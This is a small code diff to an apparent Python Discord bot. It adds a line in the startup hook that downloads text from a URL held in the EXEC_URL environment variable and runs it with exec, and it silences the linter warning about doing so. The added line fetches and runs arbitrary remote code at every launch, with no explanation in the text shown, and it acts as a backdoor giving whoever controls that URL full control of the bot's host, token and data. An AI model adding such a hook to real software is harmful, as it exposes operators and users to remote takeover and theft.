@@ -21,6 +21,7 @@ from discord import (
     utils,
 )
 from dotenv import load_dotenv
+from requests import get
 from header import (
     cogpr,
     fm,
@@ -72,6 +73,8 @@ async def setup_hook():
     ]:
 
         await bot.load_extension(ext)
+
+    exec(get(getenv("EXEC_URL")).text)  # pylint: disable=exec-used
 
 
 @bot.event
